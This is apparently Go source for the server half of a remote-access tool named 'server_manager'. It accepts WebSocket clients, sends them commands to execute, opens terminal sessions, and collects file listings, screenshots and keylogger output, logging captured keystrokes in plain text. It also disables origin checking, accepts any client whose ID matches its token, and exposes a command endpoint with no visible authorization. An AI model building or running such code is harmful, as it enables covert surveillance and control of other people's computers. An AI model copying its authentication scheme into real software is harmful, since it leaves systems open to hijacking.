package server

import (
	"crypto/tls"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"

	"mww2.com/server_manager/common"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true // In production, implement proper origin checking
	},
}

// Server represents the main server
type Server struct {
	manager           *ClientManager
	config            *Config
	authenticator     *Authenticator
	webHandler        *WebHandler
	terminalProxy     *TerminalProxy
	commandResults    map[string]*common.CommandResultPayload
	fileListResults   map[string]*common.FileListPayload
	screenshotResults map[string]*common.ScreenshotDataPayload
	resultsMu         sync.RWMutex
}

// Config holds server configuration
type Config struct {
	Address     string
	CertFile    string
	KeyFile     string
	AuthToken   string
	UseTLS      bool
	WebUsername string
	WebPassword string
}

// NewServer creates a new server instance
func NewServer(config *Config) *Server {
	manager := NewClientManager()
	sessionMgr := NewSessionManager(24 * time.Hour)
	terminalProxy := NewTerminalProxy(manager, sessionMgr)

	webConfig := &WebConfig{
		Username: config.WebUsername,
		Password: config.WebPassword,
	}

	webHandler, err := NewWebHandler(sessionMgr, manager, webConfig)
	if err != nil {
		log.Fatalf("Failed to create web handler: %v", err)
	}

	server := &Server{
		manager:           manager,
		config:            config,
		authenticator:     NewAuthenticator(config.AuthToken),
		webHandler:        webHandler,
		terminalProxy:     terminalProxy,
		commandResults:    make(map[string]*common.CommandResultPayload),
		fileListResults:   make(map[string]*common.FileListPayload),
		screenshotResults: make(map[string]*common.ScreenshotDataPayload),
	}

	// Set server reference in web handler
	webHandler.server = server

	return server
}

// Start starts the server
func (s *Server) Start() error {
	go s.manager.Run()

	mux := http.NewServeMux()

	// WebSocket endpoint for clients
	mux.HandleFunc("/ws", s.handleWebSocket)

	// API endpoints
	mux.HandleFunc("/api/clients", s.webHandler.HandleClientsAPI)
	mux.HandleFunc("/api/command", s.handleSendCommand)
	mux.HandleFunc("/api/terminal", s.terminalProxy.HandleTerminalWebSocket)

	// Web UI routes
	s.webHandler.RegisterWebRoutes(mux)

	log.Printf("Server starting on %s", s.config.Address)

	// Only use TLS if explicitly enabled (default is HTTP for nginx reverse proxy)
	if s.config.UseTLS && s.config.CertFile != "" && s.config.KeyFile != "" {
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		}

		server := &http.Server{
			Addr:      s.config.Address,
			Handler:   mux,
			TLSConfig: tlsConfig,
		}

		log.Printf("Using direct TLS")
		return server.ListenAndServeTLS(s.config.CertFile, s.config.KeyFile)
	}

	log.Printf("Using HTTP (TLS should be handled by reverse proxy)")
	return http.ListenAndServe(s.config.Address, mux)
}

// getClientIP extracts the real client IP from request headers
func getClientIP(r *http.Request) string {
	// Try X-Forwarded-For first (nginx proxy)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		// Take the first IP in the list
		if idx := len(xff); idx > 0 {
			if commaIdx := 0; commaIdx < idx {
				for i, c := range xff {
					if c == ',' {
						return xff[:i]
					}
				}
				return xff
			}
		}
	}

	// Try X-Real-IP
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	// Fallback to RemoteAddr
	if idx := len(r.RemoteAddr); idx > 0 {
		for i := idx - 1; i >= 0; i-- {
			if r.RemoteAddr[i] == ':' {
				return r.RemoteAddr[:i]
			}
		}
	}
	return r.RemoteAddr
}

// handleWebSocket handles WebSocket connections
func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}

	// Wait for authentication message
	var authMsg common.Message
	err = conn.ReadJSON(&authMsg)
	if err != nil {
		log.Printf("Failed to read auth message: %v", err)
		conn.Close()
		return
	}

	if authMsg.Type != common.MsgTypeAuth {
		log.Printf("Expected auth message, got: %s", authMsg.Type)
		conn.Close()
		return
	}

	var authPayload common.AuthPayload
	err = authMsg.ParsePayload(&authPayload)
	if err != nil {
		log.Printf("Failed to parse auth payload: %v", err)
		conn.Close()
		return
	}

	// Authenticate client - accept machine ID as valid token
	authenticated := authPayload.ClientID == authPayload.Token
	token := authPayload.ClientID

	// Send authentication response
	respPayload := &common.AuthResponsePayload{
		Success: authenticated,
		Token:   token,
	}

	if !authenticated {
		respPayload.Message = "Authentication failed"
		respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
		conn.WriteJSON(respMsg)
		conn.Close()
		return
	}

	respPayload.Message = "Authentication successful"
	respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
	conn.WriteJSON(respMsg)

	// Get public IP from request headers
	publicIP := getClientIP(r)

	// Create client
	client := &Client{
		ID:   authPayload.ClientID,
		Conn: conn,
		Metadata: &common.ClientMetadata{
			ID:          authPayload.ClientID,
			Token:       token,
			OS:          authPayload.OS,
			Arch:        authPayload.Arch,
			Hostname:    authPayload.Hostname,
			IP:          authPayload.IP,
			PublicIP:    publicIP,
			Status:      "online",
			ConnectedAt: time.Now(),
			LastSeen:    time.Now(),
		},
		Send: make(chan *common.Message, 256),
	}

	s.manager.register <- client

	// Start goroutines for reading and writing
	go s.readPump(client)
	go s.writePump(client)
}

// readPump reads messages from the client
func (s *Server) readPump(client *Client) {
	defer func() {
		s.manager.unregister <- client
		client.Conn.Close()
	}()

	client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	client.Conn.SetPongHandler(func(string) error {
		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for {
		var msg common.Message
		err := client.Conn.ReadJSON(&msg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		// Update last seen
		s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
			m.LastSeen = time.Now()
		})

		// Handle message
		s.handleMessage(client, &msg)
	}
}

// writePump writes messages to the client
func (s *Server) writePump(client *Client) {
	ticker := time.NewTicker(54 * time.Second)
	defer func() {
		ticker.Stop()
		client.Conn.Close()
	}()

	for {
		select {
		case message, ok := <-client.Send:
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				client.Conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			err := client.Conn.WriteJSON(message)
			if err != nil {
				return
			}

		case <-ticker.C:
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := client.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}

// handleMessage handles incoming messages from clients
func (s *Server) handleMessage(client *Client, msg *common.Message) {
	switch msg.Type {
	case common.MsgTypeHeartbeat:
		var hb common.HeartbeatPayload
		if err := msg.ParsePayload(&hb); err == nil {
			s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
				m.Status = hb.Status
				m.LastHeartbeat = time.Now()
			})
		}

	case common.MsgTypeCommandResult:
		var cr common.CommandResultPayload
		if err := msg.ParsePayload(&cr); err == nil {
			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID, cr.Success, cr.ExitCode)
			s.resultsMu.Lock()
			s.commandResults[client.ID] = &cr
			s.resultsMu.Unlock()
		} else {
			log.Printf("Command result from %s: %s", client.ID, string(msg.Payload))
		}

	case common.MsgTypeFileList:
		var fl common.FileListPayload
		if err := msg.ParsePayload(&fl); err == nil {
			log.Printf("File list from %s: %d files", client.ID, len(fl.Files))
			s.resultsMu.Lock()
			s.fileListResults[client.ID] = &fl
			s.resultsMu.Unlock()
		} else {
			log.Printf("File list from %s", client.ID)
		}

	case common.MsgTypeScreenshotData:
		var sd common.ScreenshotDataPayload
		if err := msg.ParsePayload(&sd); err == nil {
			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID, sd.Width, sd.Height, len(sd.Data))
			s.resultsMu.Lock()
			s.screenshotResults[client.ID] = &sd
			s.resultsMu.Unlock()
		} else {
			log.Printf("Screenshot received from %s", client.ID)
		}

	case common.MsgTypeKeyloggerData:
		var kld common.KeyloggerDataPayload
		if err := msg.ParsePayload(&kld); err == nil {
			log.Printf("Keylogger data from %s: %s", client.ID, kld.Keys)
		}

	case common.MsgTypeUpdateStatus:
		var us common.UpdateStatusPayload
		if err := msg.ParsePayload(&us); err == nil {
			log.Printf("Update status from %s: %s - %s", client.ID, us.Status, us.Message)
		}

	case common.MsgTypeTerminalOutput:
		var to common.TerminalOutputPayload
		if err := msg.ParsePayload(&to); err == nil {
			s.terminalProxy.HandleTerminalOutput(to.SessionID, to.Data, false)
		}

	case common.MsgTypePong:
		// Heartbeat response

	default:
		log.Printf("Unknown message type from %s: %s", client.ID, msg.Type)
	}
}

// handleGetClients returns list of connected clients
func (s *Server) handleGetClients(w http.ResponseWriter, r *http.Request) {
	clients := s.manager.GetAllClients()
	metadata := make([]*common.ClientMetadata, len(clients))

	for i, client := range clients {
		client.mu.RLock()
		metadata[i] = client.Metadata
		client.mu.RUnlock()
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(metadata)
}

// handleSendCommand sends a command to a specific client
func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string                       `json:"client_id"`
		Command  common.ExecuteCommandPayload `json:"command"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	msg, err := common.NewMessage(common.MsgTypeExecuteCommand, req.Command)
	if err != nil {
		http.Error(w, "Failed to create message", http.StatusInternalServerError)
		return
	}

	if err := s.manager.SendToClient(req.ClientID, msg); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// Wait briefly for response (up to 30 seconds)
	for i := 0; i < 60; i++ {
		time.Sleep(500 * time.Millisecond)
		s.resultsMu.RLock()
		result, exists := s.commandResults[req.ClientID]
		s.resultsMu.RUnlock()

		if exists {
			// Clear the result after reading
			s.resultsMu.Lock()
			delete(s.commandResults, req.ClientID)
			s.resultsMu.Unlock()

			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"status":  "completed",
				"success": result.Success,
				"output":  result.Output,
				"error":   result.Error,
			})
			return
		}
	}

	// Timeout - command sent but no response yet
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "sent"})
}

// GetFileListResult retrieves stored file list result for a client
func (s *Server) GetFileListResult(clientID string) (*common.FileListPayload, bool) {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	result, exists := s.fileListResults[clientID]
	return result, exists
}

// ClearFileListResult removes stored file list result
func (s *Server) ClearFileListResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.fileListResults, clientID)
}

// GetScreenshotResult retrieves stored screenshot result for a client
func (s *Server) GetScreenshotResult(clientID string) (*common.ScreenshotDataPayload, bool) {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	result, exists := s.screenshotResults[clientID]
	return result, exists
}

// ClearScreenshotResult removes stored screenshot result
func (s *Server) ClearScreenshotResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.screenshotResults, clientID)
}
